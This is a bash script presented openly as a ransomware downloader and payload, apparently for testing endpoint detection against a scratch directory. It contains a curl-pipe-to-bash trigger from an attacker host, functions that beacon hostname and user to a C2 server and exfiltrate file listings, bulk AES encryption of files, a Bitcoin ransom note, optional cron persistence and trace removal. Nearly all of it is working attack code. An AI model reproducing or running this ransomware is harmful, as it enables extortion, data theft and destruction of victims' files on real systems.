#!/bin/bash
# Payload Downloader: Fetches ransomware from C2 or inline, executes
# Trigger: curl -s http://attacker-ip:8000/payload_downloader.sh | bash

C2_URL="http://attacker-ip:8080"  # Replace with actual C2 IP
RANSOM_URL="$C2_URL/ransomware.sh"  # But inline for self-contained

# Fetch ransomware (or use inline below)
# curl -s "$RANSOM_URL" > /tmp/ransom.sh && chmod +x /tmp/ransom.sh && /tmp/ransom.sh

# Inline ransomware for direct exec (simulates fetch)
RANSOM_PAYLOAD=$(cat << 'EOF'
#!/bin/bash
# Ransomware Core: Encrypts, beacons to C2, exfils fake data
TARGET_DIR="/tmp/test_victim"
KEY="ransomkey-$(date +%s)-$(uuidgen | cut -d- -f1)"
IV=$(openssl rand -hex 16)
ENCRYPTED_EXT=".seized"
C2_ENDPOINT="$C2_URL"

# Beacon to C2
beacon_to_c2() {
    curl -s -X POST "$C2_ENDPOINT/beacon" \
         -H "Content-Type: application/json" \
         -d "{\"hostname\": \"$(hostname)\", \"user\": \"$(whoami)\", \"pid\": $$}\" >/dev/null
}

# Exfil fake victim data
exfil_data() {
    FAKE_DATA="{\"files\": [$(ls "$TARGET_DIR" | head -5 | sed 's/^/"/;s/$/"/' | paste -sd, )], \"key_hint\": \"$KEY\"}"
    curl -s -X POST "$C2_ENDPOINT/exfil" \
         -H "Content-Type: application/json" \
         -d "$FAKE_DATA" >/dev/null
}

encrypt_file() {
    local file="$1"
    if [[ -f "$file" && ! "${file}" =~ ${ENCRYPTED_EXT}$ ]]; then
        local content=$(cat "$file")
        echo -n "$content" | openssl enc -aes-256-cbc -a -salt -k "$KEY" -iv "$IV" -out "${file}.tmp" >/dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            mv "${file}.tmp" "${file}${ENCRYPTED_EXT}"
            echo "Seized: $file"
            ((seized_count++))
        fi
    fi
}

# Setup if needed
if [[ ! -d "$TARGET_DIR" ]]; then
    mkdir -p "$TARGET_DIR"
    for i in {1..200}; do
        echo "Critical data $i" > "$TARGET_DIR/critical$i.bin"
    done
fi

# Beacon first
beacon_to_c2
sleep 2  # Simulate delay

# Encrypt bulk
seized_count=0
export -f encrypt_file
export TARGET_DIR KEY IV ENCRYPTED_EXT
find "$TARGET_DIR" -type f ! -name "README.txt" ! -name "*seized*" -print0 | xargs -0 -I {} -P 4 bash -c 'encrypt_file "$@"' _ {}
echo "Seized $seized_count assets."

# Ransom note
cat > "$TARGET_DIR/README.txt" << EOR
ASSETS COMPROMISED BY SHADOW OPS
All data seized. Transfer 5 BTC to 1ShadowRansomWallet789abc or permanent wipe.
Recovery hint: Key starts with $KEY
Exfil confirmed to C2.
EOR

# Exfil
exfil_data

# Second beacon
beacon_to_c2

# Persist (optional, for testing)
# crontab -l | { cat; echo "* * * * * $0 --silent"; } | crontab -

echo "Operation complete. Check C2 for beacons/exfils. SentinelOne alerts expected on curl, openssl, file bulk ops."
EOF
)

# Execute ransomware
echo "$RANSOM_PAYLOAD" | bash
# Clean payload trace
rm -f /tmp/ransom.sh
